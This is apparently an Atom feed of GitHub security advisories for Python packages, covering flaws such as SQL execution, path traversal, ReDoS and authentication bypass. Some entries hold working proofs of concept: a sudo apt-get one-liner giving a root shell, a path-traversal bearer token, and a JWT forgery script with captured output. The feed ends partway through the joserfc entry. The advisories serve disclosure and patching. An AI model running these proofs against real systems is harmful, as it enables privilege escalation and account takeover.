<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-07-05T20:14:43.616Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[recce] Recce server has unauthenticated SQL execution that allows local file read/write through DuckDB]]></title>
        <id>https://github.com/advisories/GHSA-rh62-j648-g5qc</id>
        <link href="https://github.com/advisories/GHSA-rh62-j648-g5qc"/>
        <updated>2026-07-02T21:14:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Recce OSS server deployments that expose the server to an untrusted network without authentication are vulnerable to unauthenticated SQL execution through the query run API.</p>
<p>When Recce is configured with a DuckDB-backed project, an attacker can use DuckDB filesystem primitives to read and write files accessible to the Recce server process. The impact depends on how Recce is deployed, but may include disclosure of local files, tampering with Recce/dbt artifacts, modification of browser-served static files leading to stored XSS, and modification of application files if those paths are writable. If Recce is run as root, file access occurs with root privileges inside that host or container.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been patched in Recce <code>v1.50.0</code>. Users should upgrade to Recce <code>v1.50.0</code> or later.</p>
<p>The patch restricts unsafe file read/write behavior for DuckDB-backed query execution and hardens the affected query path. Other warehouse adapters have also been reviewed for similar exposure.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to Sitampan (<a href="https://x.com/hxcbtc">@hxcbtc</a>) for responsibly reporting this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users who cannot upgrade immediately should avoid exposing <code>recce server</code> to the public internet or any untrusted network.</p>
<p>Recommended mitigations include enabling authentication or placing Recce behind an authenticated reverse proxy/VPN, running Recce as a non-root user, using a read-only application filesystem where possible, and ensuring that sensitive files or credentials are not available to the Recce process.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/DataRecce/recce/security/advisories/GHSA-rh62-j648-g5qc">https://github.com/DataRecce/recce/security/advisories/GHSA-rh62-j648-g5qc</a></li>
<li><a href="https://github.com/DataRecce/recce/releases/tag/v1.50.0">https://github.com/DataRecce/recce/releases/tag/v1.50.0</a></li>
<li><a href="https://github.com/advisories/GHSA-rh62-j648-g5qc">https://github.com/advisories/GHSA-rh62-j648-g5qc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rh62-j648-g5qc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T21:14:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kiwitcms] Kiwi TCMS's /init-db/ page renders and responds to requests after first use]]></title>
        <id>https://github.com/advisories/GHSA-v8rp-6xcv-fwgh</id>
        <link href="https://github.com/advisories/GHSA-v8rp-6xcv-fwgh"/>
        <updated>2026-07-02T20:55:22.000Z</updated>
        <content type="html"><![CDATA[<p>Kiwi TCMS provides the /init-db/ page as part of its setup mechanism for administrators who prefer a browser instead of the command line. In previous versions of Kiwi TCMS this page still renders and responds to requests even after first use.</p>
<h3 id="impact">Impact</h3>
<p>The /init-db/ page does not require any user authentication because it is the first setup operation that needs to be executed in order for Kiwi TCMS to function. Database initialization happens before there are any user accounts available!</p>
<p>While that looks serious at first the /init-db/ page is merely a proxy behind the <code>/Kiwi/manage.py migrate</code> command, which itself is designed to be reentrant. In the case of repeated access to the /init-db/ page after first use the output is:</p>
<pre><code>Running migrations:
  No migrations to apply.
</code></pre>
<p>as shown on the screenshots below:</p>
<img width="1911" height="992" alt="2222" src="https://github.com/user-attachments/assets/9f661c71-b305-4380-aadf-0732321b3666">

<img width="1913" height="1020" alt="3333" src="https://github.com/user-attachments/assets/10f8553e-675d-42be-9adc-cd5613df015c">

<ul>
<li>There is no data loss because migrations result in a no-op if they are already applied!</li>
<li>No application state is altered because all state changes have already been applied! </li>
<li>No confidential information revealed because database migrations only report status on migrations which are clearly visible in source code!</li>
</ul>
<h3 id="remediation">Remediation</h3>
<p>The /init-db/ page has been modified to short-circuit itself if migrations have already been applied, resulting in a no-op on the webUI layer as well.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-v8rp-6xcv-fwgh">https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-v8rp-6xcv-fwgh</a></li>
<li><a href="https://github.com/advisories/GHSA-v8rp-6xcv-fwgh">https://github.com/advisories/GHSA-v8rp-6xcv-fwgh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8rp-6xcv-fwgh</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-02T20:55:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[xiaomusic] xiaomusic contains an unauthenticated path traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5j8p-5rrj-8wjg</id>
        <link href="https://github.com/advisories/GHSA-5j8p-5rrj-8wjg"/>
        <updated>2026-07-02T20:53:26.000Z</updated>
        <content type="html"><![CDATA[<p>xiaomusic v0.5.7 contains an unauthenticated path traversal vulnerability in the GET /music/{file_path:path} endpoint that allows unauthenticated attackers to read arbitrary files outside the intended music directory by exploiting an incomplete path prefix check. Attackers can request files from sibling directories whose names share the music_path prefix by crafting traversal sequences, bypassing the path restriction due to the missing trailing separator in the comparison logic to retrieve arbitrary files from the server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10108">https://nvd.nist.gov/vuln/detail/CVE-2026-10108</a></li>
<li><a href="https://github.com/hanxi/xiaomusic/issues/890">https://github.com/hanxi/xiaomusic/issues/890</a></li>
<li><a href="https://github.com/hanxi/xiaomusic/pull/891">https://github.com/hanxi/xiaomusic/pull/891</a></li>
<li><a href="https://github.com/hanxi/xiaomusic/commit/88404da7a283f2c0a796a4cd16bbb6e6aa1f4722">https://github.com/hanxi/xiaomusic/commit/88404da7a283f2c0a796a4cd16bbb6e6aa1f4722</a></li>
<li><a href="https://www.vulncheck.com/advisories/xiaomusic-path-traversal-via-get-music-endpoint">https://www.vulncheck.com/advisories/xiaomusic-path-traversal-via-get-music-endpoint</a></li>
<li><a href="https://github.com/advisories/GHSA-5j8p-5rrj-8wjg">https://github.com/advisories/GHSA-5j8p-5rrj-8wjg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5j8p-5rrj-8wjg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-29T18:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[agno] agno contains a SQL injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-82m5-3pcp-hccq</id>
        <link href="https://github.com/advisories/GHSA-82m5-3pcp-hccq"/>
        <updated>2026-07-02T20:52:35.000Z</updated>
        <content type="html"><![CDATA[<p>agno 2.6.5 contains a SQL injection vulnerability in the ClickHouse vector database backend that allows attackers to inject arbitrary SQL expressions by supplying malicious metadata keys and values to the delete_by_metadata() method. Attackers can exploit the unsafe f-string interpolation in clickhousedb.py to delete all rows, target specific rows, or extract information through error-based or blind SQL injection techniques.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10105">https://nvd.nist.gov/vuln/detail/CVE-2026-10105</a></li>
<li><a href="https://github.com/agno-agi/agno/issues/7866">https://github.com/agno-agi/agno/issues/7866</a></li>
<li><a href="https://github.com/agno-agi/agno/pull/7883">https://github.com/agno-agi/agno/pull/7883</a></li>
<li><a href="https://github.com/agno-agi/agno/pull/7883/changes/26a7439b803c0ccc9a58ee53572d8088a678923f">https://github.com/agno-agi/agno/pull/7883/changes/26a7439b803c0ccc9a58ee53572d8088a678923f</a></li>
<li><a href="https://github.com/agno-agi/agno/pull/7883/changes/a0ec99305e782e68ba26f5966c53ad50b5f40132">https://github.com/agno-agi/agno/pull/7883/changes/a0ec99305e782e68ba26f5966c53ad50b5f40132</a></li>
<li><a href="https://www.vulncheck.com/advisories/agno-sql-injection-via-clickhouse-delete-by-metadata">https://www.vulncheck.com/advisories/agno-sql-injection-via-clickhouse-delete-by-metadata</a></li>
<li><a href="https://github.com/advisories/GHSA-82m5-3pcp-hccq">https://github.com/advisories/GHSA-82m5-3pcp-hccq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82m5-3pcp-hccq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-29T18:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cleo] cleo is vulnerable to Regular Expression Denial of Service (ReDoS)]]></title>
        <id>https://github.com/advisories/GHSA-2p9h-ccw7-33gf</id>
        <link href="https://github.com/advisories/GHSA-2p9h-ccw7-33gf"/>
        <updated>2026-07-02T20:40:19.000Z</updated>
        <content type="html"><![CDATA[<p>An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the cleo PyPI package, when an attacker is able to supply arbitrary input to the Table.set_rows method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-42966">https://nvd.nist.gov/vuln/detail/CVE-2022-42966</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/cleo-redos-xray-257186">https://research.jfrog.com/vulnerabilities/cleo-redos-xray-257186</a></li>
<li><a href="https://github.com/python-poetry/cleo/pull/285">https://github.com/python-poetry/cleo/pull/285</a></li>
<li><a href="https://github.com/python-poetry/cleo/commit/b5b9a04d2caf58bf7cf94eb7ae4a1ebbe60ea455">https://github.com/python-poetry/cleo/commit/b5b9a04d2caf58bf7cf94eb7ae4a1ebbe60ea455</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/cleo/PYSEC-2022-43178.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/cleo/PYSEC-2022-43178.yaml</a></li>
<li><a href="https://github.com/python-poetry/cleo/releases/tag/2.0.0">https://github.com/python-poetry/cleo/releases/tag/2.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-2p9h-ccw7-33gf">https://github.com/advisories/GHSA-2p9h-ccw7-33gf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2p9h-ccw7-33gf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-11-10T12:01:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fast-mcp-telegram] fast-mcp-telegram: Bearer token path traversal bypasses reserved Telegram session protection]]></title>
        <id>https://github.com/advisories/GHSA-rxw2-pc8j-vxwm</id>
        <link href="https://github.com/advisories/GHSA-rxw2-pc8j-vxwm"/>
        <updated>2026-07-02T20:38:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>fast-mcp-telegram validates HTTP Bearer tokens by joining the raw token string into a session-file path. The verifier rejects the exact reserved token <code>telegram</code>, but it does not reject path separators or normalize the path before checking whether the session file exists. A remote HTTP client can therefore authenticate as the default legacy session with a token such as <code>../fast-mcp-telegram/telegram</code> when the documented default session file <code>~/.config/fast-mcp-telegram/telegram.session</code> exists.</p>
<p>This bypasses the reserved session name control that is intended to prevent HTTP multi-user sessions from colliding with the default stdio or legacy account. With account-prefixed MCP tools enabled, the attacker still sees and calls the prefixed tools for the default account, so the prefix middleware does not stop the session selection bypass.</p>
<h2 id="impact">Impact</h2>
<p>An unauthenticated network client can access the Telegram account represented by the default <code>telegram.session</code> file without knowing a generated bearer token, if that legacy or default session file is present on a server running HTTP auth. The attacker can then call Telegram MCP tools as that account, including message reading, message sending, MTProto API calls, and attachment-producing tool surfaces available to the session.</p>
<h2 id="technical-details">Technical details</h2>
<p><code>SessionFileTokenVerifier.verify_token()</code> strips whitespace and rejects exact reserved names:</p>
<pre><code class="language-python">if token.lower() in RESERVED_SESSION_NAMES:
    return None
</code></pre>
<p>It then appends <code>.session</code> to the raw token and checks the resulting path:</p>
<pre><code class="language-python">session_path = self._session_directory / f"{token}.session"
if not session_path.is_file():
    return None
</code></pre>
<p>No check rejects <code>/</code>, <code>\\</code>, <code>..</code>, absolute paths, or resolved paths outside the configured session directory. The session client path is built the same way in <code>src/client/connection.py</code>:</p>
<pre><code class="language-python">session_path = SESSION_DIR / f"{token}.session"
client = await _build_telegram_client_for_token(session_path, token)
</code></pre>
<p>With the default session directory, the token <code>../fast-mcp-telegram/telegram</code> resolves as follows:</p>
<pre><code class="language-text">~/.config/fast-mcp-telegram/../fast-mcp-telegram/telegram.session
= ~/.config/fast-mcp-telegram/telegram.session
</code></pre>
<p>The exact token <code>telegram</code> is denied, but the traversal alias reaches the same file and is accepted. This is especially important because <code>telegram</code> is the documented default <code>session_name</code>, and the security documentation says reserved names are blocked to prevent conflicts with stdio and HTTP no-auth sessions.</p>
<p>The vulnerable code is present on current <code>master</code> commit <code>167ab705f1cd09b21e85c370570471fe75a4f8c9</code> and in release tag <code>0.19.0</code> commit <code>77bdf6d7e5c6a84d87acc423db613e6c6ba30094</code>.</p>
<h2 id="reproduction">Reproduction</h2>
<p>The following proof uses stub session files and stub Telegram clients, so it does not need real Telegram credentials. It validates the auth decision and the eventual session path used by the client builder.</p>
<p>Run on current master:</p>
<pre><code class="language-bash">git clone https://github.com/leshchenko1979/fast-mcp-telegram.git
cd fast-mcp-telegram
python validation_token_traversal.py
</code></pre>
<p>The local proof script created for validation is attached below for reference:</p>
<pre><code class="language-python"># High-level proof outline
# 1. Create a temporary session directory containing telegram.session and a random token session.
# 2. Instantiate SessionFileTokenVerifier with that directory.
# 3. Verify denied controls: token `telegram` is rejected, and a traversal token to a missing file is rejected.
# 4. Verify allowed control: a normal random token with a matching session file is accepted.
# 5. Verify bypass: token `../fast-mcp-telegram/telegram` is accepted and the client builder receives the default telegram.session path.
# 6. Verify prefix behavior: account-prefixed tools are listed for the traversal-authenticated default account, a prefixed call reaches send_message, and an unprefixed call is still denied.
</code></pre>
<p>Key controls from the current-master run:</p>
<pre><code class="language-json">{
  "reserved_default_token_denied": true,
  "normal_random_token_allowed": true,
  "missing_traversal_token_denied": true,
  "traversal_alias_to_reserved_default_allowed": true,
  "traversal_access_token_value": "../fast-mcp-telegram/telegram",
  "client_builder_used_default_session_file": true,
  "prefixed_tool_listed_for_traversal_token": "defaultalice_send_message",
  "prefixed_tool_call_reached_handler_as": "send_message",
  "unprefixed_tool_call_denied_when_prefix_resolved": true
}
</code></pre>
<p>Interpretation:</p>
<ol>
<li>Denied control: the exact reserved token <code>telegram</code> is rejected.</li>
<li>Allowed control: a normal random session token is accepted when its matching session file exists.</li>
<li>Denied control: a traversal token pointing to a missing file is rejected.</li>
<li>Bypass: <code>../fast-mcp-telegram/telegram</code> authenticates and the client builder receives the resolved default session path.</li>
<li>Prefix control: once authenticated through the traversal token, account-prefixed tools are listed and a prefixed <code>tools/call</code> reaches the internal <code>send_message</code> handler. An unprefixed call is rejected when the prefix resolves, so the confirmed bug is the session selection and authentication bypass, not a missing-prefix execution bypass.</li>
</ol>
<h2 id="why-this-crosses-the-auth-boundary">Why this crosses the auth boundary</h2>
<p>A production HTTP auth deployment is expected to require high-entropy per-session bearer tokens. Reserved names are explicitly blocked because common names such as <code>telegram</code> can collide with the default session. The traversal alias turns the public token namespace back into a filesystem namespace and bypasses that reserved-name policy.</p>
<p>The account-prefix middleware is downstream of authentication. It labels tools based on the resolved Telegram account for the token that was accepted. Because the traversal token is accepted as a valid FastMCP <code>AccessToken</code>, the middleware correctly exposes the default account's prefixed tools to the attacker. It cannot recover the lost authentication boundary.</p>
<h2 id="remediation">Remediation</h2>
<p>Reject bearer tokens that are not strict opaque token identifiers before using them in file paths. Recommended checks:</p>
<ol>
<li>Accept only a safe token alphabet, for example <code>^[A-Za-z0-9_-]{32,128}$</code>, matching generated URL-safe base64 tokens.</li>
<li>Reject <code>/</code>, <code>\\</code>, <code>.</code>, <code>..</code>, empty segments, and absolute paths for both header auth and URL auth.</li>
<li>Resolve the final session path and require it to remain directly under the configured session directory:</li>
</ol>
<pre><code class="language-python">session_dir = self._session_directory.resolve()
session_path = (session_dir / f"{token}.session").resolve()
if session_path.parent != session_dir:
    return None
</code></pre>
<ol start="4">
<li>Apply the same validation in <code>SessionFileTokenVerifier</code>, URL auth middleware, setup flows, cleanup code, and any code that opens session files by token.</li>
<li>Add regression tests for exact reserved names, traversal aliases such as <code>../fast-mcp-telegram/telegram</code>, absolute paths, URL-encoded traversal if any route decodes path components, Windows separators, and normal generated tokens.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/leshchenko1979/fast-mcp-telegram/security/advisories/GHSA-rxw2-pc8j-vxwm">https://github.com/leshchenko1979/fast-mcp-telegram/security/advisories/GHSA-rxw2-pc8j-vxwm</a></li>
<li><a href="https://github.com/advisories/GHSA-rxw2-pc8j-vxwm">https://github.com/advisories/GHSA-rxw2-pc8j-vxwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rxw2-pc8j-vxwm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-02T20:38:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[linuxfabrik-lib] Linuxfabrik Monitoring Plugins: Sudoers may be able to obtain privilege escalation via /usr/bin/apt-get arguments]]></title>
        <id>https://github.com/advisories/GHSA-8w6w-23mq-h8rg</id>
        <link href="https://github.com/advisories/GHSA-8w6w-23mq-h8rg"/>
        <updated>2026-07-02T20:23:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In the <a href="https://github.com/Linuxfabrik/monitoring-plugins/blob/main/assets/sudoers/Debian.sudoers">Debian.sudoers</a> file, <code>apt-get</code> is allowed for the nagios user. The full command including the arguments are not enforced and can therefore be choosen arbitrarily. This allows to easily get a root shell as the nagios user:</p>
<h3 id="poc">PoC</h3>
<p>By choosing a particular argument, you can get (as a nagios user) a root shell:</p>
<pre><code>sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"
</code></pre>
<p>Since the nagious user can use sudo to run apt-get as root, the resulting shell is also running as root.</p>
<h3 id="impact">Impact</h3>
<p>The vulnerability is a local privilege escalation, impacting users who use the provided sudoers file. It requires that an attacker already compromised the nagios account (which is quite a high barrier to be honest).</p>
<h3 id="fix">Fix</h3>
<p>Since only one place where <code>apt-get</code> is currently used (in <a href="https://github.com/Linuxfabrik/monitoring-plugins/blob/998302a5fb43e89df1359f4cbb6558f81c96ae4f/check-plugins/deb-updates/deb-updates#L124">deb-updates</a>) was found, it should be enough to allow only the specific arguments used there.</p>
<p>Here an example how the line in the sudoers file could look like:</p>
<pre><code>                    /usr/lib64/nagios/plugins/strongswan-connections,\
                    /usr/lib64/nagios/plugins/systemd-unit,\
                    /usr/bin/apt-get update --quiet 2
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Linuxfabrik/monitoring-plugins/security/advisories/GHSA-8w6w-23mq-h8rg">https://github.com/Linuxfabrik/monitoring-plugins/security/advisories/GHSA-8w6w-23mq-h8rg</a></li>
<li><a href="https://github.com/advisories/GHSA-8w6w-23mq-h8rg">https://github.com/advisories/GHSA-8w6w-23mq-h8rg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8w6w-23mq-h8rg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T20:23:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[joserfc] joserfc: HS256/HS384/HS512 verify accepts empty/nil HMAC key (cross-language sibling of CVE-2026-45363)]]></title>
        <id>https://github.com/advisories/GHSA-gg9x-qcx2-xmrh</id>
        <link href="https://github.com/advisories/GHSA-gg9x-qcx2-xmrh"/>
        <updated>2026-07-02T19:12:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>joserfc.jwt.decode</code> accepts attacker-forged HMAC-signed tokens when the
caller-supplied verification key is the empty string or <code>None</code>.
<code>HMACAlgorithm.sign</code> and <code>HMACAlgorithm.verify</code> in
<a href="https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/jws_algs.py#L62-L70"><code>src/joserfc/_rfc7518/jws_algs.py:62-70</code></a> feed whatever
<code>OctKey.get_op_key(...)</code> produced into <code>hmac.new(...)</code>, and <code>OctKey.import_key</code>
only emits a <code>SecurityWarning</code> when the raw key is shorter than 14 bytes
without rejecting zero-length input. Any application whose JWT secret is
sourced from an unset environment variable, an unset Redis / DB row, a key
finder fallback that returns <code>""</code>, or a <code>Hash.new("")</code>-style default verifies
attacker tokens forged with <code>HMAC(key=b"", signing_input)</code> because the
attacker trivially reproduces the same digest with no secret knowledge.</p>
<p>This is a cross-language sibling of jwt/ruby-jwt GHSA-c32j-vqhx-rx3x /
CVE-2026-45363 (HS256/HS384/HS512 verify accepted an empty/nil HMAC key,
filed 2026-05-13). ruby-jwt v3.2.0 added an <code>ensure_valid_key!</code> precondition
that rejects empty keys at both sign and verify entry; joserfc has no
equivalent. (The same primitive lives in the deprecated <code>authlib.jose</code>
module by the same maintainer; filing this advisory against joserfc
alongside a separate <code>authlib</code> advisory because the codebases are
independent shipping artifacts on PyPI.)</p>
<h3 id="affected-versions">Affected versions</h3>
<p><code>joserfc</code> (PyPI) <code>&lt;= 1.6.7</code> (latest published release reproduces). No
patched release.</p>
<h3 id="privilege-required">Privilege required</h3>
<p>Unauthenticated. Any HTTP / RPC endpoint that calls <code>joserfc.jwt.decode</code>
with a verification key sourced from configuration is reachable. The
condition that makes the bug observable is operator-side: the configured
secret resolves to <code>""</code> or <code>None</code>. Common patterns that produce this state
in production:</p>
<ul>
<li><code>OctKey.import_key(os.environ.get("JWT_SECRET", ""))</code></li>
<li>A key finder callable that returns <code>""</code> / <code>None</code> for an unknown <code>kid</code></li>
<li>Default values like <code>os.getenv("SECRET") or ""</code>, <code>cfg.get("secret", "")</code></li>
<li>Database / Redis row lookup that returns <code>""</code> for a missing row</li>
</ul>
<h3 id="vulnerable-code">Vulnerable code</h3>
<p><a href="https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/jws_algs.py#L43-L70"><code>src/joserfc/_rfc7518/jws_algs.py:43-70</code></a>:</p>
<pre><code class="language-python">class HMACAlgorithm(JWSAlgModel):
    SHA256 = hashlib.sha256
    SHA384 = hashlib.sha384
    SHA512 = hashlib.sha512

    def __init__(self, sha_type, recommended=False):
        self.name = f"HS{sha_type}"
        self.description = f"HMAC using SHA-{sha_type}"
        self.recommended = recommended
        self.hash_alg = getattr(self, f"SHA{sha_type}")
        self.algorithm_security = sha_type

    def sign(self, msg: bytes, key: OctKey) -&gt; bytes:
        op_key = key.get_op_key("sign")
        return hmac.new(op_key, msg, self.hash_alg).digest()

    def verify(self, msg: bytes, sig: bytes, key: OctKey) -&gt; bool:
        op_key = key.get_op_key("verify")
        v_sig = hmac.new(op_key, msg, self.hash_alg).digest()
        return hmac.compare_digest(sig, v_sig)
</code></pre>
<p><a href="https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/oct_key.py#L52-L63"><code>src/joserfc/_rfc7518/oct_key.py:52-63</code></a>:</p>
<pre><code class="language-python">@classmethod
def import_key(cls, value, parameters=None, password=None) -&gt; "OctKey":
    key: OctKey = super(OctKey, cls).import_key(value, parameters, password)
    if len(key.raw_value) &lt; 14:
        # https://csrc.nist.gov/publications/detail/sp/800-131a/rev-2/final
        warnings.warn("Key size should be &gt;= 112 bits", SecurityWarning)
    return key
</code></pre>
<p>The <code>&lt; 14</code> check only warns; <code>len(key.raw_value) == 0</code> falls through and is
returned to the caller. <code>HMACAlgorithm.verify</code> then calls
<code>hmac.compare_digest(sig, hmac.new(b"", signing_input, sha256).digest())</code>,
and Python's <code>hmac.new(b"", ...)</code> accepts the empty key.</p>
<p>Cross-language sibling of ruby-jwt's fix in <a href="https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/lib/jwt/jwa/hmac.rb"><code>lib/jwt/jwa/hmac.rb</code></a>:</p>
<pre><code class="language-ruby">def ensure_valid_key!(key)
  raise_verify_error!('HMAC key expected to be a String') unless key.is_a?(String)
  raise_verify_error!('HMAC key cannot be empty') if key.empty?
end
</code></pre>
<p>invoked from both <code>sign(signing_key:)</code> and <code>verify(verification_key:)</code>.
PyJWT landed an equivalent guard in 2.13.0 (<code>HMACAlgorithm.prepare_key</code>
raises <code>InvalidKeyError("HMAC key must not be empty.")</code> for <code>len(key_bytes) == 0</code>).
firebase/php-jwt rejects empty material in <code>Key.__construct</code>. jjwt enforces a
256-bit minimum in <code>DefaultMacAlgorithm.validateKey</code>. joserfc has the
strongest existing length-warning logic but stops at <code>&lt; 14 bytes</code> warn
rather than <code>== 0</code> reject.</p>
<h3 id="how-an-empty-jwt_secret-reaches-hmacnew">How an empty <code>JWT_SECRET</code> reaches <code>hmac.new</code></h3>
<ol>
<li>The application calls <code>joserfc.jwt.decode(value, key, algorithms=["HS256"])</code>
where <code>key = OctKey.import_key("")</code> (or <code>OctKey.import_key(b"")</code>,
or any custom path that yields an <code>OctKey</code> whose <code>raw_value</code> is <code>b""</code>).</li>
<li><code>decode</code> (<a href="https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/jwt.py#L86-L117"><code>src/joserfc/jwt.py:86-117</code></a>) calls <code>_decode_jws(...)</code> →
<code>deserialize_compact(value, key, algorithms, registry)</code>.</li>
<li><code>deserialize_compact</code> (<a href="https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/jws.py"><code>src/joserfc/jws.py</code></a>) dispatches to
<code>HMACAlgorithm.verify(signing_input, signature, key)</code>.</li>
<li><code>verify</code> calls <code>key.get_op_key("verify")</code> → returns <code>b""</code>.</li>
<li><code>hmac.new(b"", signing_input, sha256).digest()</code> is computed; the
attacker computed exactly that digest with the same empty key, so
<code>hmac.compare_digest</code> returns <code>True</code> and decode succeeds.</li>
</ol>
<p>No upstream <code>nil</code>-check, no length check, no schema rejection. The path is
reached from the public <code>joserfc.jwt.decode</code> API.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Attacker (no secret knowledge):</p>
<pre><code class="language-python">import base64, hmac, hashlib, json, time
def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
now = int(time.time())
payload = b64url(json.dumps({
    "sub": "attacker", "admin": True,
    "iat": now, "exp": now + 600,
}).encode())
signing_input = header + b"." + payload
sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
forged = signing_input + b"." + b64url(sig)
print(forged.decode())
</code></pre>
<p>Server harness:</p>
<pre><code class="language-python"># server.py
from joserfc import jwt
from joserfc.jwk import OctKey
import os
from wsgiref.simple_server import make_server

def app(environ, start_response):
    auth = environ.get("HTTP_AUTHORIZATION", "")
    token = auth[len("Bearer "):].strip() if auth.startswith("Bearer ") else ""
    key = OctKey.import_key(os.environ.get("JWT_SECRET", ""))  # default = ""
    try:
        tok = jwt.decode(token, key, algorithms=["HS256"])
        c = tok.claims
        body = ("OK: sub=%r admin=%r\n" % (c.get("sub"), c.get("admin"))).encode()
        start_response("200 OK", [("Content-Type", "text/plain")])
        return [body]
    except Exception as e:
        start_response("401 Unauthorized", [("Content-Type", "text/plain")])
        return [("DENY: %s\n" % e).encode()]

make_server("127.0.0.1", 8383, app).serve_forever()
</code></pre>
<h3 id="end-to-end-reproduction-against-pip-install-joserfc167">End-to-end reproduction (against <code>pip install joserfc==1.6.7</code>)</h3>
<pre><code class="language-bash"># 1. Boot the WSGI server. JWT_SECRET unset to model the misconfigured-secret
#    state.
python3.12 -m venv venv
./venv/bin/pip install joserfc==1.6.7
./venv/bin/python server.py &amp;   # listens on :8383

# 2. Run the attacker
./venv/bin/python attacker.py
</code></pre>
<p>Captured run output (canonical pre-fix run, joserfc 1.6.7,
<code>poc-attacker-empty-20260523-150949.log</code>):</p>
<pre><code>forged token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYXR0YWNrZXIiLCAiYWRtaW4iOiB0cnVlLCAiaWF0IjogMTc3OTUyMDU4OSwgImV4cCI6IDE3Nzk1MjExODl9.yE8nFmSVmQJ2Slft-BlxD04ypabkV128XbPcU6SRnBY
HTTP 200
OK: sub='attacker' admin=True
</code></pre>
<p>Control (real 256-bit secret, <code>poc-control-realkey-20260523-150959.log</code>):</p>
<pre><code>forged token: eyJhbGciOiAiSFMyNTYi...
HTTP 401
DENY: BadSignatureError: bad_signature:
</code></pre>
<p>Interpretation:</p>
<table>
<thead>
<tr>
<th>Configuration</th>
<th>Observed</th>
<th>Expected</th>
</tr>
</thead>
<tbody><tr>
